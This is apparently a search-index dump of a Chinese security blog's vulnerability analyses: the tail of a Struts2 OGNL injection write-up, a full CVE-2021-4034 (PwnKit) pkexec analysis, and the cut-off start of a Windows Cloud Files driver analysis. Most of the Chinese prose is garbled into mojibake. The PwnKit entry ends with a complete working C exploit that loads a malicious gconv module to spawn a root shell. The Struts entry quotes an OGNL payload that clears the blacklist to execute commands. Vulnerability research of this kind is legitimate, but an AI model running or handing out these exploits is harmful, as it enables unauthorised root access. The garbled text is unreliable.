1; i \u0026lt;= ilast; ++i) { boolean handled = false; if (i \u0026lt; ilast \u0026amp;\u0026amp; this._children[i] instanceof ASTProperty) { ASTProperty propertyNode = (ASTProperty)this._children[i]; int indexType = propertyNode.getIndexedPropertyType(context, result); if (indexType != OgnlRuntime.INDEXED_PROPERTY_NONE \u0026amp;\u0026amp; this._children[i + 1] instanceof ASTProperty) { ASTProperty indexNode = (ASTProperty)this._children[i + 1]; if (indexNode.isIndexedAccess()) { Object index = indexNode.getProperty(context, result); if (index instanceof DynamicSubscript) { if (indexType == OgnlRuntime.INDEXED_PROPERTY_INT) { ...... } } else if (indexType == OgnlRuntime.INDEXED_PROPERTY_OBJECT) { throw new OgnlException(\u0026#34;DynamicSubscript \u0026#39;\u0026#34; + indexNode + \u0026#34;\u0026#39; not allowed for object indexed property \u0026#39;\u0026#34; + propertyNode + \u0026#34;\u0026#39;\u0026#34;); } } if (!handled) { result = OgnlRuntime.getIndexedProperty(context, result, propertyNode.getProperty(context, result).toString(), index); handled = true; ++i; } } } } if (!handled) { result = this._children[i].getValue(context, result); } } return result; } ç»§ç»­è¿è¡Œï¼ŒIDEAåœ¨setBean:536, BeanMap (org.apache.commons.collections)æ–­ä¸‹ï¼Œæ­¤æ—¶é€šè¿‡setBeanå°†contextå­˜åˆ°beanå¯¹è±¡ä¸­ åœ¨initialiseæ–¹æ³•ä¸­ä¼šå°†PoCä¸­ä¼ å…¥çš„valueStackåˆ†ä¸ºnameå’Œå¯¹åº”çš„getæ–¹æ³•å­˜å‚¨åˆ°HashMapä¸­ï¼Œå¯ä»¥çœ‹åˆ°contextå¯¹åº”äºpublic java.util.Map com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()\nè€Œååœ¨é€šè¿‡bean.getè·å–åˆ°contextï¼Œå‰é¢çŸ¥é“contextå¯¹åº”äºgetContextæ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨è¿™ä¸ªæ–¹æ³•è·å–åˆ°äº†stackä¸­çš„contextã€‚ å†æ¬¡é€šè¿‡bean.setBeanå­˜å‚¨åˆ°beanä¸­ é€šè¿‡beanè·å–memverAccessï¼Œå¯¹åº”SecurityMemberAccesså¯¹è±¡ å¯ä»¥çœ‹åˆ°åœ¨å…¶ä¸­å·²æœ‰é¢„å…ˆåˆå§‹åŒ–çš„é»‘åå•ç±»å’ŒåŒ…åï¼Œå…¶ä¸­åŒ…æ‹¬åé¢æ‰§è¡Œå‘½ä»¤ä½¿ç”¨çš„freemarker.template åœ¨com.opensymphony.xwork2.ognl.isAccessibleä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ¯æ¬¡æ‰§è¡ŒOgnlè¡¨è¾¾å¼ä¹‹å‰éƒ½ä¼šæ£€æŸ¥åŒ…åå’Œç±»åæ˜¯å¦åœ¨é»‘åå•å†… æ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ è€Œåé€šè¿‡bean.putå°†é»‘åå•è¦†ç›–åï¼Œåœ¨ä½¿ç”¨#execute=#instancemanager.newInstance(\u0026quot;freemarker.template.utility.Execute\u0026quot;)).(#execute.exec(#arglist)æ—¶é»‘åå•å·²ç»æ˜¯ç©ºé›†äº†ï¼Œç›´æ¥é€šè¿‡äº†æ ¡éªŒã€‚\nè€Œååœ¨freemarker.template.utility.Execute.execæ–¹æ³•ä¸­ç›´æ¥é€šè¿‡è°ƒç”¨Runtime.getRuntime().exec(aExecute)æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ Diffå¯¹æ¯”\nåœ¨\r0a75d8e8fa3e75d538fb0fcbc75473bdbff9209eå¯¹æ¯”å¯çŸ¥å½“å­—ç¬¦ä¸²ä¸­ä¸åŒ…å«è¡¨è¾¾å¼æ—¶æ‰ä¼šæ·»åŠ %{} å¹¶ä¸”é™åˆ¶äº†è§£ætagæ—¶çš„ä¸å®‰å…¨è¡Œä¸º åŒæ—¶å°†ä¸€äº›å±é™©ç±»åŠ å…¥é»‘åå•ä¸­\rhttps://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94 å°ç»“ è¿™ä¸ªæ¼æ´åˆ©ç”¨äº†OGNLè¡¨è¾¾å¼çš„äºŒæ¬¡è§£æï¼Œæ³¨å…¥OGNLè¡¨è¾¾å¼ï¼Œå·§å¦™åœ°åˆ©ç”¨tomcatå®¹å™¨ä¸­çš„Beanç±»è·å–OGNL contextï¼Œå¹¶é€šè¿‡Beanç±»çš„get/setBeanæ–¹æ³•é‡ç½®é»‘åå•ï¼Œè€Œååˆ©ç”¨é»‘åå•ä¸­çš„ç±»æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.anquanke.com/post/id/225252\nCreated at 2023-12-04T19:21:08+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/","title":"CVE-2021-4034 Polkit æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Polkitæ˜¯ä¸€ä¸ªç”¨äºåœ¨ç±»Unixæ“ä½œç³»ç»Ÿä¸­æ§åˆ¶ç³»ç»ŸèŒƒå›´æƒé™çš„ç»„ä»¶ï¼Œå®ƒä¸ºéç‰¹æƒè¿›ç¨‹ä¸ç‰¹æƒè¿›ç¨‹æä¾›äº†ä¸€ç§é€šä¿¡æ–¹å¼ã€‚Polkitä¸­çš„pkexecåº”ç”¨ç¨‹åºæ—¨åœ¨å…è®¸éç‰¹æƒç”¨æˆ·æ ¹æ®é¢„å®šä¹‰çš„ç­–ç•¥ä»¥ç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ã€‚ Polkit pkexecå­˜åœ¨æœ¬åœ°æƒé™æå‡æ¼æ´ã€‚ç”±äºpkexecæ— æ³•æ­£ç¡®å¤„ç†è°ƒç”¨å‚æ•°è®¡æ•°ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ¶ä½œç¯å¢ƒå˜é‡æ¥è¯±å¯¼pkexecæ‰§è¡Œä»»æ„ä»£ç ã€‚å…·æœ‰ä½æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ç»•è¿‡pkexecè‡ªå¸¦çš„å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œè·å–ç›®æ ‡æœºå™¨çš„ROOTæƒé™ã€‚\nå½±å“ç‰ˆæœ¬ Polkité»˜è®¤å®‰è£…åœ¨å¤šä¸ªä¸»æµLinuxç³»ç»Ÿä¸Šï¼Œç”±2009å¹´5æœˆå‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬å¼•å…¥ï¼Œå¹¶å½±å“åç»­æ‰€æœ‰ç‰ˆæœ¬ã€‚ä»¥ä¸‹ä¸ºCentOSåŠUbuntuä¸Šçš„å®‰å…¨ç‰ˆæœ¬ï¼š CentOSç³»åˆ—ï¼š CentOS 6ï¼špolkit-0.96-11.el6_10.2 CentOS 7ï¼špolkit-0.112-26.el7_9.1 CentOS 8.0ï¼špolkit-0.115-13.el8_5.1 CentOS 8.2ï¼špolkit-0.115-11.el8_2.2 CentOS 8.4ï¼špolkit-0.115-11.el8_4.2 Ubuntuç³»åˆ—ï¼š Ubuntu 20.04 LTSï¼špolicykit-1-0.105-26ubuntu1.2 Ubuntu 18.04 LTSï¼špolicykit-1-0.105-20ubuntu0.18.04.6 Ubuntu 16.04 ESMï¼špolicykit-1-0.105-14.1ubuntu0.5+esm1 Ubuntu 14.04 ESMï¼špolicykit-1-0.105-4ubuntu3.14.04.6+esm1 ç¯å¢ƒæ­å»º æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åœ¨\ræºç ä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼šnè¢«èµ‹å€¼ä¸º1ï¼Œè€Œåé€šè¿‡g_strdupå‡½æ•°åœ¨å †å†…åˆ†é…å†…å­˜å¹¶å°†argv[n]å¤åˆ¶è¿›å»ï¼Œå°†åˆ†é…åˆ°å†…å­˜åœ°å€è¿”å›ç»™pathå˜é‡ã€‚å½“ä¸åŠ ä»»ä½•å‚æ•°æ—¶ï¼Œargvæ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œè€Œargv[1]å®é™…æŒ‡å‘envp[0]ï¼Œä¹Ÿå°±æ˜¯ä¼šæŠŠç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªå¤åˆ¶ç»™pathå˜é‡\nfor (n = 1; n \u0026lt; (guint) argc; n++) { if (strcmp (argv[n], \u0026#34;--help\u0026#34;) == 0) { opt_show_help = TRUE; } else if (strcmp (argv[n], \u0026#34;--version\u0026#34;) == 0) { opt_show_version = TRUE; } else if (strcmp (argv[n], \u0026#34;--user\u0026#34;) == 0 || strcmp (argv[n], \u0026#34;-u\u0026#34;) == 0) { ..... { g_printerr (\u0026#34;--user specified twice\\n\u0026#34;); goto out; } opt_user = g_strdup (argv[n]); } else if (strcmp (argv[n], \u0026#34;--disable-internal-agent\u0026#34;) == 0) ..... } ..... /* Now figure out the command-line to run - argv is guaranteed to be NULL-terminated, see * * http://lkml.indiana.edu/hypermail/linux/kernel/0409.2/0287.html * * but do check this is the case. * * We also try to locate the program in the path if a non-absolute path is given. */ g_assert (argv[argc] == NULL); path = g_strdup (argv[n]); è€Œåå¦‚æœenvp[0]!='/'åˆ™ä¼šé€šè¿‡g_find_program_in_pathåœ¨PATHç¯å¢ƒå˜é‡å†…çš„ç›®å½•ä¸­å¯»æ‰¾ç¬¬ä¸€ä¸ªåå­—ä¸ºpathå˜é‡çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶åˆ†é…å†…å­˜å­˜å‚¨å…¶ç»å¯¹è·¯å¾„ï¼Œæ²¡æ‰¾åˆ°åˆ™ä¼šè¿”å›NULLã€‚ å†æ‰¾åˆ°ä¹‹åä¼šå°†å…¶å†™å…¥åˆ°argv[n]ï¼Œå‰é¢è¯´è¿‡å½“æ²¡æœ‰ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°æ—¶ï¼Œnä¸º1 argv[1]æŒ‡å‘envp[0]ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶æ‰§è¡Œpkexecçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨pkexecæ‰§è¡Œæ—¶æ³¨å…¥ç¯å¢ƒå˜é‡ã€‚\nif (path[0] != \u0026#39;/\u0026#39;) { /* g_find_program_in_path() is not suspectible to attacks via the environment */ s = g_find_program_in_path (path); if (s == NULL) { g_printerr (\u0026#34;Cannot run program %s: %s\\n\u0026#34;, path, strerror (ENOENT)); goto out; } g_free (path); argv[n] = path = s; } é‚£ä¸ºä»€ä¹ˆè¦ç»•è¿™ä¹ˆå¤§ä¸€åœˆæ¥æ³¨å…¥ç¯å¢ƒå˜é‡å‘¢ï¼Œç›´æ¥åœ¨execveæ—¶é€šè¿‡envpå‚æ•°æ³¨å…¥å‘—ã€‚ åœ¨\rglibc.soå®ç°ä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼šå¾ªç¯éå†unsecure_envvarsï¼Œå¹¶ä¸”å°è¯•è°ƒç”¨unsetenvæ¥å–æ¶ˆè¯¥ç¯å¢ƒå˜é‡(å¦‚æœæœ‰çš„è¯)ã€‚\nif (__libc_enable_secure) { static const char unsecure_envvars[] = UNSECURE_ENVVARS #ifdef EXTRA_UNSECURE_ENVVARS EXTRA_UNSECURE_ENVVARS #endif ; const char *cp = unsecure_envvars; while (cp \u0026lt; unsecure_envvars + sizeof (unsecure_envvars)) { __unsetenv (cp); cp = (const char *) __rawmemchr (cp, \u0026#39;\\0\u0026#39;) + 1; } unsecure_envvarså®šä¹‰åœ¨\rhttps://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.htmlè¿™äº›ç¯å¢ƒå˜é‡èƒ½å¤Ÿå¼•å…¥å¤–éƒ¨soï¼Œä»è€Œåœ¨æ‰§è¡Œç¨‹åºçš„æ—¶å€™æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¿™åœ¨æ‰§è¡Œsuidç¨‹åºæ—¶æ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥glibcåœ¨åˆå§‹åŒ–æ—¶å°±å°†è¿™äº›ç¯å¢ƒå˜é‡å»é™¤äº†é™¤éç¨‹åºä¸»åŠ¨setenvã€‚\n#define UNSECURE_ENVVARS \\ \u0026#34;GCONV_PATH\\0\u0026#34;\t\\ \u0026#34;GETCONF_DIR\\0\u0026#34;\t\\ GLIBC_TUNABLES_ENVVAR\t\\ \u0026#34;HOSTALIASES\\0\u0026#34;\t\\ \u0026#34;LD_AUDIT\\0\u0026#34;\t\\ \u0026#34;LD_DEBUG\\0\u0026#34;\t\\ \u0026#34;LD_DEBUG_OUTPUT\\0\u0026#34;\t\\ \u0026#34;LD_DYNAMIC_WEAK\\0\u0026#34;\t\\ \u0026#34;LD_HWCAP_MASK\\0\u0026#34;\t\\ \u0026#34;LD_LIBRARY_PATH\\0\u0026#34;\t\\ \u0026#34;LD_ORIGIN_PATH\\0\u0026#34;\t\\ \u0026#34;LD_PRELOAD\\0\u0026#34;\t\\ \u0026#34;LD_PROFILE\\0\u0026#34;\t\\ \u0026#34;LD_SHOW_AUXV\\0\u0026#34;\t\\ \u0026#34;LD_USE_LOAD_BIAS\\0\u0026#34;\t\\ \u0026#34;LOCALDOMAIN\\0\u0026#34;\t\\ \u0026#34;LOCPATH\\0\u0026#34;\t\\ \u0026#34;MALLOC_TRACE\\0\u0026#34;\t\\ \u0026#34;NIS_PATH\\0\u0026#34;\t\\ \u0026#34;NLSPATH\\0\u0026#34;\t\\ \u0026#34;RESOLV_HOST_CONF\\0\u0026#34;\t\\ \u0026#34;RES_OPTIONS\\0\u0026#34;\t\\ \u0026#34;TMPDIR\\0\u0026#34;\t\\ \u0026#34;TZDIR\\0\u0026#34; å¦‚ä½•è§¦å‘åŠ è½½ï¼Œä»£ç ä¸­æœ‰å¦‚ä¸‹åœ¨å¾ªç¯ä¸­ä¼šéå†environment_variables_to_saveå¹¶è·å–å¯¹åº”çš„ç¯å¢ƒå˜é‡çš„å€¼ï¼Œä¼ å…¥åˆ°validate_environment_variableå‡½æ•°ä¸­ã€‚ validate_environment_variableå‡½æ•°ä¼šéªŒè¯SHELLå’ŒXAUTHORITYç¯å¢ƒå˜é‡æ˜¯å¦åˆæ³•ï¼Œå½“SHELLç¯å¢ƒå˜é‡ä¸å±äº/etc/shellsä¸­çš„ä»»æ„ä¸€ä¸ªåˆ™ä¼šè°ƒç”¨g_printerrï¼Œæˆ–è€…XAUTHORITYç¯å¢ƒå˜é‡ä¸­åŒ…å«%æˆ–..ä¹Ÿä¼šè°ƒç”¨g_printerr\nconst gchar *environment_variables_to_save[] = { \u0026#34;SHELL\u0026#34;, \u0026#34;LANG\u0026#34;, \u0026#34;LINGUAS\u0026#34;, \u0026#34;LANGUAGE\u0026#34;, \u0026#34;LC_COLLATE\u0026#34;, \u0026#34;LC_CTYPE\u0026#34;, \u0026#34;LC_MESSAGES\u0026#34;, \u0026#34;LC_MONETARY\u0026#34;, \u0026#34;LC_NUMERIC\u0026#34;, \u0026#34;LC_TIME\u0026#34;, \u0026#34;LC_ALL\u0026#34;, \u0026#34;TERM\u0026#34;, \u0026#34;COLORTERM\u0026#34;, \u0026#34;DISPLAY\u0026#34;, \u0026#34;XAUTHORITY\u0026#34;, NULL }; saved_env = g_ptr_array_new (); for (n = 0; environment_variables_to_save[n] != NULL; n++) { const gchar *key = environment_variables_to_save[n]; const gchar *value; value = g_getenv (key); if (value == NULL) continue; /* To qualify for the paranoia goldstar - we validate the value of each * environment variable passed through - this is to attempt to avoid * exploits in (potentially broken) programs launched via pkexec(1). */ if (!validate_environment_variable (key, value)) goto out; g_ptr_array_add (saved_env, g_strdup (key)); g_ptr_array_add (saved_env, g_strdup (value)); } validate_environment_variable (const gchar *key, const gchar *value) { gboolean ret; /* Generally we bail if any environment variable value contains * * - \u0026#39;/\u0026#39; characters * - \u0026#39;%\u0026#39; characters * - \u0026#39;..\u0026#39; substrings */ g_return_val_if_fail (key != NULL, FALSE); g_return_val_if_fail (value != NULL, FALSE); ret = FALSE; /* special case $SHELL */ if (g_strcmp0 (key, \u0026#34;SHELL\u0026#34;) == 0) { /* check if it\u0026#39;s in /etc/shells */ if (!is_valid_shell (value)) { log_message (LOG_CRIT, TRUE, \u0026#34;The value for the SHELL variable was not found the /etc/shells file\u0026#34;); g_printerr (\u0026#34;\\n\u0026#34; \u0026#34;This incident has been reported.\\n\u0026#34;); goto out; } } else if ((g_strcmp0 (key, \u0026#34;XAUTHORITY\u0026#34;) != 0 \u0026amp;\u0026amp; strstr (value, \u0026#34;/\u0026#34;) != NULL) || strstr (value, \u0026#34;%\u0026#34;) != NULL || strstr (value, \u0026#34;..\u0026#34;) != NULL) { log_message (LOG_CRIT, TRUE, \u0026#34;The value for environment variable %s contains suscipious content\u0026#34;, key); g_printerr (\u0026#34;\\n\u0026#34; \u0026#34;This incident has been reported.\\n\u0026#34;); goto out; } ret = TRUE; out: return ret; } /etc/shellsæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nâœ c cat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash /usr/bin/pwsh /opt/microsoft/powershell/7/pwsh /usr/bin/tmux /usr/bin/screen /bin/zsh /usr/bin/zsh /usr/bin/zsh è§¦å‘è·¯å¾„\nå½“CHARSETç¯å¢ƒå˜é‡ä¸æ˜¯UTF-8æ—¶ï¼Œg_printerrä¸èƒ½æ­£ç¡®æ‰“å°é”™è¯¯æ¶ˆæ¯åˆ°stderrï¼Œä¸ºäº†å°†é”™è¯¯æ¶ˆæ¯è½¬åŒ–ä¸ºå…¶ä»–å­—ç¬¦é›†ï¼Œg_printerrä¼šè°ƒç”¨iconv_open()ï¼Œiconv_open()ä¼šæ‰§è¡Œå…±äº«åº“ï¼Œå¹¶ä¸”è¯»å–é»˜è®¤é…ç½®æ–‡ä»¶/usr/lib/gconv/gconv-modulesï¼Œå½“GCONV_PATHç¯å¢ƒå˜é‡å­˜åœ¨æ—¶ï¼Œå¯ä»¥å¼ºåˆ¶iconv_open()ä½¿ç”¨GCONV_PATHæŒ‡å‘çš„ç›®å½•ä¸­è¯»å–gconv-modulesé…ç½®æ–‡ä»¶ã€‚\nå› æ­¤åˆ©ç”¨å¯ä»¥æ„é€ å¦‚ä¸‹ç¯å¢ƒå˜é‡ï¼Œåœ¨é€šè¿‡execveå¯åŠ¨æ—¶ï¼Œpwnkitä¼šä¼ é€’ç»™g_find_program_in_pathå‡½æ•°ï¼Œå°è¯•åœ¨PATHæŒ‡å‘çš„ç›®å½•ä¸­å¯»æ‰¾åä¸ºpwnkitçš„å¯æ‰§è¡Œç¨‹åºï¼Œæ­¤æ—¶ä¼šæ‰¾åˆ°GCONV_PATH=./pwnkitï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™argv[1]å®é™…ä¸Šæ˜¯envp[0]å‘pkexecæ³¨å…¥äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚\nchar *env[] = { \u0026#34;pwnkit\u0026#34;, \u0026#34;PATH=GCONV_PATH=.\u0026#34;, \u0026#34;CHARSET=PWNKIT\u0026#34;, \u0026#34;SHELL=pwnkit\u0026#34;, NULL }; è€Œåç”±äºCHARSETä¸æ˜¯UTF-8ï¼Œåœ¨SHELLè§¦å‘g_printerrï¼Œg_printerrä¼šè°ƒç”¨iconv_open()å‡½æ•°ï¼Œç”±äºæ³¨å…¥äº†ç¯å¢ƒå˜é‡GCONV_PATHï¼Œiconv_openå‡½æ•°ä¼šå°è¯•åœ¨GCONV_PATHæŒ‡å‘çš„ç›®å½•ï¼Œå³./pwnkitç›®å½•ä¸‹è¯»å–gconv-modulesæ–‡ä»¶ï¼Œæ­¤æ—¶./pwnkit/gconv-moduleså·²ç»è¢«è¦†ç›–ä¸ºå¦‚ä¸‹å†…å®¹ï¼š\nmodule UTF-8// PWNKIT// pwnkit 1 è¿™ä¸ªé…ç½®æ–‡ä»¶æŒ‡ç¤ºiconv_open()ï¼Œå½“å°è¯•ä»UTF-8å‘PWNKITè½¬æ¢æ—¶åº”è¯¥åŠ è½½pwnkit.soï¼Œè€ŒCHARSETå³ç›®æ ‡å­—ç¬¦é›†å·²ç»è¢«è®¾ç½®ä¸ºPWNKITï¼Œæ‰€ä»¥ä¼šå°è¯•åŠ è½½pwnkit.soï¼Œåªéœ€è¦ä½¿æˆ‘ä»¬çš„soåœ¨pwnkit/pwnkit.soç›®å½•å³å¯ä½¿å¾—pkexecä»¥rootæƒé™åŠ è½½æˆ‘ä»¬çš„æ¶æ„soï¼Œè¾¾æˆææƒã€‚\næ¼æ´ä¿®å¤\nå‰é¢åˆ†æçŸ¥é“è§¦å‘æ¼æ´éœ€è¦argc=0ï¼Œæ‰€ä»¥åœ¨ç¨‹åºå¯åŠ¨æ—¶ç›‘æµ‹argc\u0026lt;1å°±ç›´æ¥é€€å‡ºäº†\nif (argc\u0026lt;1) { exit(127); } PoC\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char *shell = \u0026#34;#include \u0026lt;stdio.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;stdlib.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;unistd.h\u0026gt;\\n\\n\u0026#34; \u0026#34;void gconv() {}\\n\u0026#34; \u0026#34;void gconv_init() {\\n\u0026#34; \u0026#34; setuid(0); setgid(0);\\n\u0026#34; \u0026#34; seteuid(0); setegid(0);\\n\u0026#34; \u0026#34; system(\\\u0026#34;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh\\\u0026#34;);\\n\u0026#34; \u0026#34; exit(0);\\n\u0026#34; \u0026#34;}\u0026#34;; int main(int argc, char *argv[]) { FILE *fp; system(\u0026#34;mkdir -p \u0026#39;GCONV_PATH=.\u0026#39;; touch \u0026#39;GCONV_PATH=./pwnkit\u0026#39;; chmod a+x \u0026#39;GCONV_PATH=./pwnkit\u0026#39;\u0026#34;); system(\u0026#34;mkdir -p pwnkit; echo \u0026#39;module UTF-8// PWNKIT// pwnkit 1\u0026#39; \u0026gt; pwnkit/gconv-modules\u0026#34;); fp = fopen(\u0026#34;pwnkit/pwnkit.c\u0026#34;, \u0026#34;w\u0026#34;); fprintf(fp, \u0026#34;%s\u0026#34;, shell); fclose(fp); system(\u0026#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC\u0026#34;); char *env[] = { \u0026#34;pwnkit\u0026#34;, \u0026#34;PATH=GCONV_PATH=.\u0026#34;, \u0026#34;CHARSET=PWNKIT\u0026#34;, \u0026#34;SHELL=pwnkit\u0026#34;, NULL }; execve(\u0026#34;./pkexec_105\u0026#34;, (char*[]){NULL}, env); } å°ç»“ è¿™ä¸ªæ¼æ´è™½ç„¶æ˜¯æº¢å‡ºæ¼æ´ï¼Œä½†æ›´ç±»ä¼¼äºé€»è¾‘æ¼æ´ï¼Œä¸éœ€è¦ä¸ºç‰¹å®šæ“ä½œç³»ç»Ÿè¿›è¡Œå¸ƒå±€ï¼Œåªéœ€è¦æ„é€ æ¶æ„ç¯å¢ƒå˜é‡ç»„å³å¯æ³¨å…¥æ¶æ„ç¯å¢ƒå˜é‡ï¼Œæ•´ä½“åˆ©ç”¨è¾ƒä¸ºç®€å•ã€‚\nå‚è€ƒé“¾æ¥\nhttps://xz.aliyun.com/t/10870\nhttps://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\nCreated at 2023-11-30T14:25:08+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/","title":"CVE-2023-36036 Windows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Windows Cloud Files Mini Filter é©±åŠ¨ä¸­å­˜åœ¨è¶Šç•Œå†™å…¥æ¼æ´ï¼Œåœ¨è§£æReparse pointæ•°æ®æ—¶ï¼Œç”±äºmemcpyå‡½æ•°çš„é•¿åº¦å‚æ•°ç”¨æˆ·å¯æ§ï¼Œæºå†…å­˜å¯æ§ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ç»“æ„å¹¶ä¼ é€’ç»™Windows Cloud Files Mini Filter é©±åŠ¨ï¼Œé€ æˆè¶Šç•Œå†™å…¥ï¼Œå¹¶åœ¨å†…æ ¸æ‰§è¡Œä»»æ„ä»£ç ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º Windows 10 23å¹´10æœˆè¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• cldflt.sysé©±åŠ¨ä¸­å®ç°äº†äº‘æ–‡ä»¶çš„å„é¡¹åŠŸèƒ½ï¼Œdiffè¯¥é©±åŠ¨ï¼Œä¿®æ”¹å‡½æ•°å¦‚ä¸‹ï¼š\nåœ¨HsmpRpiDecompressBufferå‡½æ•°ä¸­æœ‰å¦‚ä¸‹ä¿®æ”¹ï¼Œå¯¹*(_WORD *)(a1 + 10)æ·»åŠ äº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯å¦\u0026gt;0x4000ï¼Œ\nå¦‚æœå¤§äºåˆ™æŠ›å‡ºé”™è¯¯ 0xC000CF02å¯¹åº” STATUS_CLOUD_FILE_METADATA_CORRUPT\nhttps://endodermis59.rssing.com/chan-36587470/all_p6.html\nAIè¾“å‡º\nHsmpRpiDecompressBufferå‡½æ•°çš„ä½œç”¨æ˜¯è§£å‹å‹ç¼©åçš„Reparse Pointæ•°æ®ã€‚ ä¸»è¦åŠŸèƒ½åŒ…æ‹¬: 1. æ ¡éªŒä¼ å…¥æ•°æ®çš„å®Œæ•´æ€§å’Œé­”æ•°æ˜¯å¦æ­£ç¡® 2. å¦‚æœæ•°æ®è¢«å‹ç¼©,åˆ™æ ¹æ®åŸé•¿åº¦åˆ†é…è§£å‹ç¼“å†²åŒº 3. è°ƒç”¨RtlDecompressBufferè¿›è¡Œå®é™…è§£å‹ 4. æ£€æŸ¥è§£å‹åæ•°æ®é•¿åº¦æ˜¯å¦åŒ¹é… 5. å¦‚æœè§£å‹æˆåŠŸ,è¿”å›è§£å‹åçš„æ•°æ® 6. å¦åˆ™è¿”å›é”™è¯¯ç  æ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„å‹ç¼©æ•°æ®è§£å‹å‡½æ•°,æ¥æ”¶åŸå§‹å‹ç¼©æ•°æ®,æ ¡éªŒ-\u0026gt;åˆ†é…ç¼“å†²åŒº-\u0026gt;è§£å‹-\u0026gt;è¿”å›è§£å‹åæ•°æ®çš„è¿‡ç¨‹ã€‚ é€šè¿‡è§£å‹è®©åç»­ä»£ç å¯ä»¥å¤„ç†æœªå‹ç¼©çš„Reparse Pointæ•°æ®,ä¸€èˆ¬åœ¨éœ€è¦æäº¤/æ›´æ–°æ•°æ®æ—¶ä¼šè§£å‹ã€‚ ä¸»è¦ä½œç”¨å°±æ˜¯å°†å‹ç¼©åçš„Reparse Pointè¿˜åŸä¸ºå¯è¯»çš„æœªå‹ç¼©æ•°æ®ã€‚ HsmpRpiDecompressBufferç”± HsmpRpReadBufferè°ƒç”¨\n__int64 __fastcall HsmpRpReadBuffer(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, unsigned __int16 **a3) { ... *a3 = 0i64; v6 = 1024; OutputBuffer = (unsigned __int16 *)ExAllocatePoolWithTag(PagedPool, 0x400ui64, 0x70527348u); v8 = OutputBuffer; ...... } LODWORD(v9) = HsmpRpiDecompressBuffer((__int64)v8, v6, a3); HsmDbgBreakOnStatus((unsigned int)v9); if ( (int)v9 \u0026lt; 0 ) { v16 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { goto LABEL_8; } v17 = 20i64; goto LABEL_30; } if ( *a3 != v8 ) LABEL_8: ExFreePoolWithTag(v8, 0x70527348u); return (unsigned int)v9; } AIè§£é‡Š\nè¿™æ®µä»£ç å®ç°äº†è§£æå’Œè§£å‹Reparse Pointæ•°æ®çš„åŠŸèƒ½: 1. åˆ†é…OutputBufferå†…å­˜ç”¨äºè¯»å–Reparseæ•°æ®ã€‚ 2. è°ƒç”¨FltFsControlFileè¯»å–Reparseæ•°æ®åˆ°OutputBufferã€‚ 3. å¦‚æœè¯»å–å¤±è´¥,å¹¶ä¸”é”™è¯¯ç è¡¨ç¤ºbufferå¤ªå°,åˆ™é‡æ–°åˆ†é…æ›´å¤§çš„bufferå¹¶é‡è¯•è¯»å–ã€‚ 4. è°ƒç”¨HsmpRpiDecompressBufferå¯¹è¯»å–åˆ°çš„æ•°æ®è¿›è¡Œè§£å‹ã€‚ 5. å¦‚æœè§£å‹æˆåŠŸ,è¿”å›è§£å‹åçš„æ•°æ®,å¦åˆ™è¿”å›é”™è¯¯ç ã€‚ 6. 